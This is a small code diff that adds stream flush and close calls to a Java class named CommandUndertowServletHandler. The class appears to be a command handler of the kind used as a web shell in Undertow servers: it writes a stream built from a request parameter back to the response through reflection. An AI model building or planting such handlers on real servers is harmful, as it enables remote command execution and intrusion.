@@ -32,6 +32,8 @@ public class CommandUndertowServletHandler {
                 InputStream inputStream = getInputStream(param);
                 OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                 outputStream.write(new Scanner(inputStream).useDelimiter("\\A").next().getBytes());
+                outputStream.flush();
+                outputStream.close();
                 return true;
             }
         } catch (Throwable e) {
